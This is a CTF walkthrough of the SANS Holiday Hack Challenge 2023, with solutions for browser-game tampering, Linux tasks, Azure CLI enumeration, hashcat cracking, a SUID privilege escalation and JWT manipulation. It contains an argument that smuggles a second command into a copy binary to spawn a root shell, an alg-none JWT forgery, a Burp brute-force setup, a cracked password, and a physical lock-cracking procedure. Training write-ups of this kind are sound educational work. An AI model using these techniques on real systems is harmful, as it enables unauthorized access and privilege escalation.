[Christmas Island](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2023_solutions.md#Christmas%20Island)
[Island of Misfit Toys](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2023_solutions.md#Island%20of%20Misfit%20Toys)
[Film Noir Island](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2023_solutions.md#Film%20Noir%20Island)
[Pixel Island](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2023_solutions.md#Pixel%20Island)
[Steampunk Island](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2023_solutions.md#Steampunk%20Island)
[Space Island](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2023_solutions.md#Space%20Island)

# Christmas Island

## Orientation

## Frosty's Beach

### Snowball Fight

- click on iframe (game window) and inspect to open developer tools
- go to sources
- enter a game
- pause in debugger
- expand global variables
- make modifications e.g. increase player health, set elf, santa throw delay to extremely high number, increase speed. Win

## Santa's Surf Shack

### Linux 101

    ls
    cat troll
    rm troll
    pwd
    ls -lah
    history | grep -i troll
    env
    cd workshop
    grep -i troll *
    chmod +x present_engine
    ./present_engine
    cd electrical
    mv blown_fuse0 fuse0
    ln -s fuse0 fuse1
    cp fuse1 fuse2
    echo TROLL_REPELLENT > fuse2
    find /opt/troll_den troll
    find /opt/troll_den -user troll
    find /opt/trol_den -type f -size +108k -size -110k
    ps aux
    netstat -lnp
    curl localhost:54321
    kill <troll pid>

## Rudolph's Rest

### Reportinator

After dissecting the report and failing I used Burp to brute force answer then read report with correct answers for context

- Capture submission request
- Forward to Intruder
- Select "Cluster bomb" because we want to test all possible combinations
- Assign payload positions to each of the nine submission fields e.g. ```input-1=§one§&input-2=§two§&...```
- Switch to payloads and create nine payload sets consisting of a simple list of ```0``` and ```1``` for each one
- This should equate to 512 total requests; when finished launch attack

Correct submission is ```3, 6, and 9 are hallucinations```

- 3 CVE is represented as CWE, port number nonsensical

- 6 is wrong; HTTP SEND does not exist

- 9 wrong, http 7.4.33 request ?

### Azure 101

    az help | less
    az account show | less
    az group list | less
    az functionapp list --subscription 2b0942f3-9bca-484b-a508-abdae2db5e64 -g northpole-rg1 | less
    az vm availability-set list --subscription 2b0942f3-9bca-484b-a508-abdae2db5e64 -g northpole-rg2 | less
    az vm run-command invoke --subscription 2b0942f3-9bca-484b-a508-abdae2db5e64 -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts "ls" | less

## Lobby

# Island of Misfit Toys

## Scaredy Kite Heights

### Hashcat

Game was slow so copied hash and password list to local kali

    hashcat --identify hhc2023.hash
    hashcat -m 18200 hhc2023.hash hhc2023.passwords
    
    IluvC4ndyC4nes!

## Ostrich Saloon

### Linux Privesc

search for binaries with suid

```find / -perm /4000```

- /usr/bin/simplecopy runs as root
```ls -l /usr/bin/simplecopy```

- let's test it out

```simplecopy /root/runtoanswer ~/```

- Investigating the binary reveals that it executes 'cp %s %s' so we can inject commands

```strings /usr/bin/simplecopy```
    
    simplecopy foo "/tmp && whoami"
    root

    simplecopy foo "/tmp && /bin/bash"
    cd /root
    ./runmetoanswer

    Who delivers Christmas Presents?

    santa

## Tarnished Trove 

###  Game Cartridges Vol. 1

Fix the QR code then scan for URL 

http://8bitelf.com

flag:santaconfusedgivingplanetsqrcode

## Squarewheel Yard

### Luggage Lock
Decode as if you would a real wheel lock (as much as possible) 
```7484``` 

### Fishing Challenge

# Film Noir Island

## The Blacklight District

### Phish Detective Agency

Basically look through emails and see if sending domain matches return path and there are no failures in DKIM or DMARC. If domains match and DKIM + DMARC are a pass then mark as safe, any mismatches or failures mark as phishing

## Chiaroscuro City 

### Na'an
Choose ```0```, ```9```, and ```nan``` in your card values and repeat until reaching a score of 10 

## Gumshoe Alley PI Office

### Kusto Detective / KQL Kraken Explorer

# Pixel Island

## Rainraster Cliffs

### Elf Hunt
Start game
Open Developer Tools
Go to Application -> Cookies -> Elf Hunt to reveal JWT token
Decode token in e.g. CyberChef
Decoded Token
```{"alg":"none","typ":"JWT"}{"speed": -500}```
Change speed to e.g ```{"speed": -50000}```, base64 encode and replace the value between the periods.
Substitute this value for the one in dev tools

# Steampunk Island

## Brass Buoy Port

### Faster Lock Combination

- Follow the process outlined in HelpfulLockPicker's video https://www.youtube.com/watch?v=27rE5ZvWLU0
- Summarized here:
    Find "sticky" number (s):
        - Rotate lock 3+ turns counter clockwise (that is rotating the knob clockwise such that the numbers cross the dial indicator in a counter clockwise order)
        - Apply tension to shackle until dial siezes
        - Remove tension until dial can rotate
        - Cycle through counter clockwise rotation noting the number where there is a consistent hitch or  force to overcome (sticky number)

        First digit in combination is s + 5 

    Find "guess" numbers and remainder:
        - Locate the two numbers between 0-11 which have their gates resting between whole numbers
        - To locate the gates apply tension and rotate clockwise, tension will cause the locking mechanism to fall into a gate, with tension applied turn back and forth to find the edges of the gate whether those stopping points land on a whole number marker or between numbers
        - Add the two numbers to get the base number for finding the third digit: x + y = z 
        - Divide the base number by 4 noting the remainder: z % 4 = r

    Create third digit table and find third digit to combination:
        - take x and y and add 10 three times
        x, x+10, x+20, x+30
        y, y+10, y+20, y+30

        - Discard any numbers that do not have the same remainder r when divided by 4
        - Test remaining numbers by turning to them on the dial and applying tension, attempt to rotate dial and note resistance
        - The number with the least resistance is more likely to be the third number

    Create second digit table:
        - take r and add 2 and 6 respecitvely to create rx and ry: r + 2 = rx, r + 6 = ry
        - Add 8 to rx and ry four times to find possible seconds digits, numbers over 40 cycle over e.g. 42 = 2
        rx, rx+8, rx+16, rx+24, rx+32
        ry, ry+8, ry+16, ry+24, ry+32
        - Eliminate any numbers that are within 2 of 0(40)

    Test possible combinations using found first and third digits and possible second digits until the combination is cracked

- You can also manipulate client side variables as in snowball fight to solve this challenge e.g. look to see combination under sources > global > lock_numbersn and even set your own

## Coggoggle Marina

# Space Island

## Cape Cosmic

